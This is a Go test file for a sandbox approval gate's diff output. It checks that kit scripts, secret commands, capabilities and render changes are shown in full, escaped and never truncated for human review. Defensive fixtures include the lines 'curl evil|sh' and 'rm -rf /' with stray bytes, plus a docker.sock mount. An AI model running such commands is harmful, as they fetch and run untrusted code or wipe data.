// SPDX-FileCopyrightText: 2026 Bruno Venceslau
// SPDX-License-Identifier: GPL-3.0-only

package gate

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/brunovenceslau/romeu-e-julieta/internal/spec"
)

var update = flag.Bool("update", false, "rewrite the golden files of testdata")

// golden compares got with testdata/name, or rewrites it with -update.
func golden(t *testing.T, name string, got []byte) {
	t.Helper()
	p := filepath.Join("testdata", name)
	if *update {
		require.NoError(t, os.WriteFile(p, got, 0o644))
	}
	want, err := os.ReadFile(p)
	require.NoError(t, err)
	assert.Equal(t, string(want), string(got))
}

// side returns the diff side of in: its widening set, its kit files and
// its secret argv.
func side(t *testing.T, in inputs) Side {
	t.Helper()
	s, err := Build(in.p, in.hs, in.r)
	require.NoError(t, err)
	out := Side{Set: s, KitFiles: map[string][]File{}, SecretArgv: map[string][]string{}, Render: in.r.Render}
	for i, k := range s.Kits {
		out.KitFiles[k.key()] = in.r.Kits[i].Files
	}
	for _, name := range in.p.Secrets {
		out.SecretArgv[name] = in.hs.Secrets[name+"@"+in.p.Name].Argv
	}
	return out
}

// text returns what the diff from approved to candidate writes.
func text(t *testing.T, approved *Side, candidate Side) string {
	t.Helper()
	d, err := NewDiff(approved, candidate)
	require.NoError(t, err)
	var b strings.Builder
	_, err = d.WriteTo(&b)
	require.NoError(t, err)
	return b.String()
}

// TestDiffGolden changes one item of each class of 01 1.4: a
// capability, a gated domain, a secret argv, the workload repository
// and a content-only kit file (10 10.1, REQ-0732).
//
//romeu:invariant I29 test
func TestDiffGolden(t *testing.T) {
	t.Parallel()
	old := baseInputs()
	old.r.Kits[1].Files = append(old.r.Kits[1].Files, File{Path: "README", Mode: ModeRegular, Data: []byte("one\ntwo\nthree\n")})
	cand := baseInputs()
	cand.r.Kits[1].Files = append(cand.r.Kits[1].Files, File{Path: "README", Mode: ModeRegular, Data: []byte("one\n2\nthree\n")})
	cand.r.WorkloadCapabilities = Capabilities{"network": []any{"registry.example"}, "mounts": []any{"/var/run/docker.sock"}}
	cand.p.Egress.Extra = append(cand.p.Egress.Extra, "upload.example")
	cand.hs.Secrets["github@shop"] = spec.Secret{Service: "github.com", Argv: []string{"/usr/bin/env", "-i", "/usr/local/bin/gh", "auth", "token"}}
	cand.p.Workload = "docker.io/other/dev@sha256:" + hex64('a')

	approved := side(t, old)
	golden(t, "diff.golden", []byte(text(t, &approved, side(t, cand))))
}

func TestDiffGoldenOfAFirstApproval(t *testing.T) {
	t.Parallel()
	golden(t, "diff-first.golden", []byte(text(t, nil, side(t, baseInputs()))))
}

// TestDiffIsNeverTruncated changes every line of a 10 000-line kit
// file: each line appears, removed and added, and the summary is
// repeated right above the prompt (I29, REQ-0071).
//
//romeu:invariant I29 test
func TestDiffIsNeverTruncated(t *testing.T) {
	t.Parallel()
	var oldText, newText strings.Builder
	for i := range 10000 {
		fmt.Fprintf(&oldText, "line %d\n", i)
		fmt.Fprintf(&newText, "LINE %d\n", i)
	}
	old, cand := baseInputs(), baseInputs()
	old.r.Kits[1].Files[0].Data = []byte(oldText.String())
	cand.r.Kits[1].Files[0].Data = []byte(newText.String())
	approved := side(t, old)
	got := text(t, &approved, side(t, cand))

	lines := map[string]bool{}
	for l := range strings.SplitSeq(got, "\n") {
		lines[l] = true
	}
	for i := range 10000 {
		require.True(t, lines[fmt.Sprintf("      -line %d", i)], "the removed line %d", i)
		require.True(t, lines[fmt.Sprintf("      +LINE %d", i)], "the added line %d", i)
	}
	summary := "  kit content personal:tools: 1 file(s) changed, 0 added, 0 removed; +10000 -10000 lines\n" +
		"  changed: kits\n"
	assert.True(t, strings.HasPrefix(got[strings.Index(got, "summary:\n"):], "summary:\n"+summary), "the summary comes first")
	assert.True(t, strings.HasSuffix(got, summary+PromptLine), "the summary is repeated right above the prompt")
}

func TestDiffShowsABinaryFileAsSizeAndSHA256(t *testing.T) {
	t.Parallel()
	old, cand := baseInputs(), baseInputs()
	old.r.Kits[1].Files[0] = File{Path: "bin/run", Mode: ModeRegular, Data: []byte{0x7f, 'E', 'L', 'F', 0, 1}}
	cand.r.Kits[1].Files[0] = File{Path: "bin/run", Mode: ModeRegular, Data: []byte{0xff, 0xfe, 'x'}}
	approved := side(t, old)
	got := text(t, &approved, side(t, cand))
	oldSum, newSum := sha256.Sum256(old.r.Kits[1].Files[0].Data), sha256.Sum256(cand.r.Kits[1].Files[0].Data)
	assert.Contains(t, got, "      binary old: 6 bytes, sha256 "+hex.EncodeToString(oldSum[:])+"\n")
	assert.Contains(t, got, "      binary new: 3 bytes, sha256 "+hex.EncodeToString(newSum[:])+"\n")
	assert.NotContains(t, got, "ELF")
}

func TestDiffEscapesWhatAKitFileHolds(t *testing.T) {
	t.Parallel()
	old, cand := baseInputs(), baseInputs()
	cand.r.Kits[1].Files[0].Data = []byte("echo \x1b[2Jcleared\u202e\n")
	approved := side(t, old)
	got := text(t, &approved, side(t, cand))
	assert.NotContains(t, got, "\x1b")
	assert.NotContains(t, got, "\u202e")
	assert.Contains(t, got, "+echo \\u001b[2Jcleared\\u202e")
}

func TestDiffShowsAChangeOfTheLastNewlineAlone(t *testing.T) {
	t.Parallel()
	old, cand := baseInputs(), baseInputs()
	cand.r.Kits[1].Files[0].Data = []byte("#!/bin/sh")
	approved := side(t, old)
	got := text(t, &approved, side(t, cand))
	assert.Contains(t, got, "      -#!/bin/sh\n      +#!/bin/sh (no newline at end of file)\n")
}

func TestNewDiffRefusesFilesOrArgvTheSetDoesNotDigest(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		edit func(s *Side)
	}{
		{"a kit file the set does not digest", func(s *Side) {
			s.KitFiles["personal:tools"] = []File{{Path: "bin/run", Mode: ModeExecutable, Data: []byte("other\n")}}
		}},
		{"a kit with no files", func(s *Side) { delete(s.KitFiles, "personal:tools") }},
		{"files of a kit the set does not hold", func(s *Side) { s.KitFiles["personal:other"] = nil }},
		{"an argv the set does not digest", func(s *Side) { s.SecretArgv["github"] = []string{"/bin/true"} }},
		{"a secret with no argv", func(s *Side) { delete(s.SecretArgv, "github") }},
		{"an argv of a secret the set does not hold", func(s *Side) { s.SecretArgv["npm"] = []string{"/bin/true"} }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			approved := side(t, baseInputs())
			cand := side(t, baseInputs())
			tt.edit(&cand)
			_, err := NewDiff(&approved, cand)
			require.Error(t, err, "the candidate")
			_, err = NewDiff(nil, cand)
			require.Error(t, err, "a first approval")
		})
	}
}

func TestNewDiffRefusesApprovedKitFilesTheApprovalDoesNotDigest(t *testing.T) {
	t.Parallel()
	approved := side(t, baseInputs())
	approved.KitFiles["personal:tools"] = []File{{Path: "bin/run", Mode: ModeExecutable, Data: []byte("other\n")}}
	_, err := NewDiff(&approved, side(t, baseInputs()))
	assert.Error(t, err)
}

// kitFileDiff returns the diff text when the file bin/run of the
// personal kit tools goes from old to new.
func kitFileDiff(t *testing.T, old, new File) string {
	t.Helper()
	o, c := baseInputs(), baseInputs()
	o.r.Kits[1].Files[0], c.r.Kits[1].Files[0] = old, new
	approved := side(t, o)
	return text(t, &approved, side(t, c))
}

// TestDiffShowsATextSideInFull: a stray byte that is not UTF-8, or a
// NUL, never hides a script; each side is judged on its own, and only a
// side that is binary is shown as its size and sha256 (I29, REQ-0071).
//
//romeu:invariant I29 test
func TestDiffShowsATextSideInFull(t *testing.T) {
	t.Parallel()
	elf := File{Path: "bin/run", Mode: ModeRegular, Data: append([]byte("\x7fELF"), make([]byte, 60)...)}
	script := File{Path: "bin/run", Mode: ModeExecutable, Data: []byte("#!/bin/sh\necho hi\n")}
	elfSum := sha256.Sum256(elf.Data)
	tests := []struct {
		name      string
		old, new  File
		want      []string
		summary   string
		forbidden []string
	}{
		{
			"an executable script with a stray byte",
			script, File{Path: "bin/run", Mode: ModeExecutable, Data: []byte("#!/bin/sh\ncurl evil|sh\n\xff")},
			[]string{"      +curl evil|sh\n", `      +\xff (no newline at end of file)` + "\n"},
			"+2 -1 lines", []string{"binary"},
		},
		{
			"a script of the regular mode with a NUL",
			File{Path: "bin/run", Mode: ModeRegular, Data: []byte("#!/bin/sh\n")},
			File{Path: "bin/run", Mode: ModeRegular, Data: []byte("#!/bin/sh\ncurl evil|sh\x00\n")},
			[]string{`      +curl evil|sh\u0000` + "\n"},
			"+1 -0 lines", []string{"binary"},
		},
		{
			"mostly UTF-8 text with one stray byte",
			File{Path: "bin/run", Mode: ModeRegular, Data: []byte("a line of plain text\n")},
			File{Path: "bin/run", Mode: ModeRegular, Data: []byte("a line of plain text\nrm -rf \xfe /\n")},
			[]string{`      +rm -rf \xfe /` + "\n"},
			"+1 -0 lines", []string{"binary"},
		},
		{
			"a binary replaced by a script",
			elf, script,
			[]string{"      binary old: 64 bytes, sha256 " + hex.EncodeToString(elfSum[:]) + "\n", "      +echo hi\n"},
			"+2 -0 lines, 1 binary side", nil,
		},
		{
			"a script replaced by a binary",
			script, elf,
			[]string{"      -echo hi\n", "      binary new: 64 bytes, sha256 " + hex.EncodeToString(elfSum[:]) + "\n"},
			"+0 -2 lines, 1 binary side", nil,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := kitFileDiff(t, tt.old, tt.new)
			for _, w := range tt.want {
				assert.Contains(t, got, w)
			}
			assert.Contains(t, got, "; "+tt.summary+"\n")
			for _, f := range tt.forbidden {
				assert.NotContains(t, got, f)
			}
		})
	}
}

// TestDiffShowsANULOnlyFileAsBinary: NUL bytes are valid UTF-8, so the
// NUL check alone makes this file binary.
func TestDiffShowsANULOnlyFileAsBinary(t *testing.T) {
	t.Parallel()
	nul := File{Path: "bin/run", Mode: ModeRegular, Data: make([]byte, 64)}
	sum := sha256.Sum256(nul.Data)
	got := kitFileDiff(t, File{Path: "bin/run", Mode: ModeRegular, Data: []byte("text\n")}, nul)
	assert.Contains(t, got, "      binary new: 64 bytes, sha256 "+hex.EncodeToString(sum[:])+"\n")
	assert.NotContains(t, got, `\u0000`)
}

// TestDiffHeadersDoNotLookLikeLines: a removed line "-- x" is shown as
// "--- x", which no header of the diff resembles.
func TestDiffHeadersDoNotLookLikeLines(t *testing.T) {
	t.Parallel()
	got := kitFileDiff(t,
		File{Path: "bin/run", Mode: ModeExecutable, Data: []byte("-- x\n")},
		File{Path: "bin/run", Mode: ModeExecutable, Data: []byte("y\n")})
	assert.Contains(t, got, "    diff bin/run:\n      @@ -1,1 +1,1 @@\n      --- x\n      +y\n")
}

func TestLineDiff(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name     string
		old, new string
		want     []string
	}{
		{"equal", "a\nb\n", "a\nb\n", nil},
		{"a duplicated line removed", "a\na\n", "a\n", []string{"@@ -2,1 +1,0 @@", "-a"}},
		{"a duplicated line added", "a\n", "a\na\n", []string{"@@ -1,0 +2,1 @@", "+a"}},
		{"three equal lines to two", "a\na\na\n", "a\na\n", []string{"@@ -3,1 +2,0 @@", "-a"}},
		{"reordered lines", "a\nb\n", "b\na\n", []string{"@@ -1,2 +1,2 @@", "-a", "-b", "+b", "+a"}},
		{"changes at both ends", "a\nm\nz\n", "A\nm\nZ\n", []string{"@@ -1,3 +1,3 @@", "-a", "-m", "-z", "+A", "+m", "+Z"}},
		{"the last newline removed", "a\nb\n", "a\nb", []string{"@@ -2,1 +2,1 @@", "-b", "+b (no newline at end of file)"}},
		{"the last newline added", "a", "a\n", []string{"@@ -1,1 +1,1 @@", "-a (no newline at end of file)", "+a"}},
		{"a line added without a last newline", "a", "a\nb", []string{"@@ -1,1 +1,2 @@", "-a (no newline at end of file)", "+a", "+b (no newline at end of file)"}},
		{"from nothing", "", "a\n", []string{"@@ -0,0 +1,1 @@", "+a"}},
		{"to nothing", "a\n", "", []string{"@@ -1,1 +0,0 @@", "-a"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, lineDiff(splitLines([]byte(tt.old)), splitLines([]byte(tt.new))))
		})
	}
}

func TestDiffShowsTheRender(t *testing.T) {
	t.Parallel()
	old, cand := baseInputs(), baseInputs()
	cand.r.Render["mounts"] = []any{"/var/run/docker.sock"}
	cand.r.Render["sandboxOptions"] = map[string]any{"cpus": 16}
	approved := side(t, old)
	got := text(t, &approved, side(t, cand))
	assert.Contains(t, got, "render (sbxenv.yaml without the ungated keys run, sandboxOptions):\n  mounts:\n    + [\"/var/run/docker.sock\"]\n")
	assert.NotContains(t, got, "cpus", "an ungated key is not part of the gate")
}

func TestNewDiffRefusesARenderTheSetDoesNotDigest(t *testing.T) {
	t.Parallel()
	cand := side(t, baseInputs())
	cand.Render = Render{"kits": []any{"other"}}
	_, err := NewDiff(nil, cand)
	require.Error(t, err)
	cand.Render = nil
	_, err = NewDiff(nil, cand)
	require.Error(t, err)
}

func TestDiffSummaryMarksReposPortsAndAgent(t *testing.T) {
	t.Parallel()
	old, cand := baseInputs(), baseInputs()
	cand.p.Repos = append(cand.p.Repos, spec.Repo{URL: "https://github.com/example/shop-web", Dir: "shop-web"})
	cand.p.Ports = []string{"9090:9090/tcp"}
	cand.p.Agent = "codex"
	approved := side(t, old)
	got := text(t, &approved, side(t, cand))
	for _, want := range []string{
		"  ! repo added: shop-web https://github.com/example/shop-web\n",
		"  ! port added: 9090:9090/tcp\n",
		"  ! port removed: 8080:8080/tcp\n",
		"  ! agent: claude -> codex\n",
	} {
		assert.Contains(t, got, want)
	}
}
